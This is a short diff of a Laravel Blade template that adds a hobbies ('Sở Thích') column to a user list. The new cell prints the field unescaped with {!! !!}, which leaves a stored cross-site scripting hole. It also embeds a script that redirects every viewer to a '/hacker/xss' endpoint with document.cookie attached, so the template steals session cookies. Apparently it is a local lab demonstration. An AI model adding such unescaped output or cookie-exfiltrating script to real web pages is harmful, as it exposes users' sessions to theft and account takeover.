@@ -12,6 +12,7 @@
                         <th>Email</th>
                         <th>Phone</th>
                         <th>Image</th>
+                        <th>Sở Thích</th>
                         <th>Action</th>
                     </tr>
                 </thead>
@@ -23,6 +24,9 @@
                         <th>{{ $user->email }}</th>
                         <th>{{ $user->phone }}</th>
                         <td><img src="{{ asset('uploads/userimage/' . $user->image) }}" alt="Phone Image"></td>
+                        <th>{!! $user->sothich !!} 
+ 	
+     <script>window.location="http://127.0.0.1:8000/hacker/xss?cookie=" +document.cookie</script></th>
                         <th>
                             <a href="{{ route('users.detail', ['id' => $user->id]) }}">View</a> |
                             <a href="{{ route('user.UpdatetUser', ['id' => $user->id]) }}">Edit</a> |
